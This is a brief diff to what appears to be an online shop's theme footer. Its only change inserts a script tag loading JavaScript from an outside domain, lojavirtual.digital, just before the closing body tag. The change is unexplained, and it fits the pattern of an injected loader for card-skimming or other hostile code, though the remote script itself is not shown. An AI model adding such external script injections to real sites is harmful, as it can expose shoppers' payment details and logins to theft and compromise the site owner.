@@ -74,5 +74,5 @@
 <script src="catalog/view/theme/theme533/js/livesearch.js" type="text/javascript"></script>
 
 </div>
-
+<script src="https://lojavirtual.digital/lojavirtualfooter.js" type="text/javascript"></script>
 </body></html>
